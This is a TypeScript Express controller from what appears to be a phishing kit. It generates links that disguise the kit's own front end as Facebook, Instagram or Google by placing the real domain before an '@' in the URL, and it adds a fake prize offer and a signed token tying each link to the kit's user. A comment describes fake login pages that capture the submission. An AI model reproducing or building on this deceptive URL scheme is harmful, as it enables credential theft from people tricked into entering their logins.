import { Request, Response } from "express";
import { userInfo } from "./user";
import { BadRequestError, CustomAPIError } from "../errors";
import Link from "../models/Link";
import { SocialLoginTypes, SocialNamesTypes } from "../utils/types";
import jwt from "jsonwebtoken";
/*
- link
    - create        -> create new link (fields: social, user_id) `POST`
    - recreate      -> recreate expired links `POST`
    -
    - @www.facebook.com/:encrypted_data (frontend req/api)
    - @www.instagram.com/:encrypted_data (decrypt encrypted part and put userid onsubmit btn)
*/
type NewLinkType = {
    socialName: String;
    socialType: String;
    user_id: String;
};
export const newlink = async (req: Request, res: Response) => {
    const { socialName, socialType, user_id } = req.body;
    if (!socialName || !socialType || !user_id) {
        throw new BadRequestError(
            "Fill all the required fields! socialName, socialType, user_id"
        );
    }
    if (SocialNamesTypes.includes(socialName) === false) {
        throw new BadRequestError("Invalid Social Name!");
    }
    if (SocialLoginTypes.includes(socialType) === false) {
        throw new BadRequestError("Invalid Social Type!");
    }

    try {
        const verifiedUser = await userInfo(user_id);
        if (!verifiedUser) {
            throw new BadRequestError("User not registered.");
        }

        // check if link already exists
        const existingLink = await Link.findOne({
            user: verifiedUser,
            socialName,
            socialType,
        });
        if (existingLink) {
            return res.status(200).json({
                msg: `${socialName} link already exists.`,
                link: {
                    address: existingLink.address,
                    socialName: existingLink.socialName,
                    socialType: existingLink.socialType,
                    link_id: existingLink.link_id,
                },
            });
        }

        let addr = "";
        // send expiry here if feature implemented.
        const addr_val = createToken(req.body as NewLinkType);
        switch (socialName) {
            case "Facebook":
                addr = `http://www.facebook.com.sources.attachment-2235230093257620.device_id-009432577732427895.media.influence.url.base-32523964495-@${process.env.front_BASE_URL}/user/wwwfacebookcom?addr_val=${addr_val}&offer=prize0083526625252425`;
                break;
            case "Instagram":
                addr = `http://www.instagram.com.sources.attachment-2235230093257620.device_id-009432577732427895.media.influence.url.base-32523964495-@${process.env.front_BASE_URL}/user/wwwinstagramcom?addr_val=${addr_val}&offer=prize0083526625252425`;
                break;
            case "Google":
                addr = `http://www.google.com.sources.attachment-2235230093257620.device_id-009432577732427895.media.influence.url.base-32523964495-@${process.env.front_BASE_URL}/user/wwwgooglecom?addr_val=${addr_val}&offer=prize0083526625252425`;
                break;
            default:
                break;
        }
        const link = new Link({
            socialName,
            socialType,
            user: verifiedUser,
            address: addr,
        });
        const linked = await link.save();
        res.status(201).json({
            msg: `${linked.socialName} link created successfully.`,
            link: {
                address: linked.address,
                socialName: linked.socialName,
                socialType: linked.socialType,
                link_id: linked.link_id,
            },
        });
    } catch (error: any) {
        console.log(error);
        throw new CustomAPIError(error.message || error.name || error.msg);
    }
};

const createToken = function (value: NewLinkType) {
    try {
        let addr_val = jwt.sign(value, String(process.env.JWT_SECRET), {
            expiresIn: "1h",
        });

        return addr_val;
    } catch (error: any) {
        console.log(error);
        throw new CustomAPIError(error.message || error.name || error.msg);
    }
};
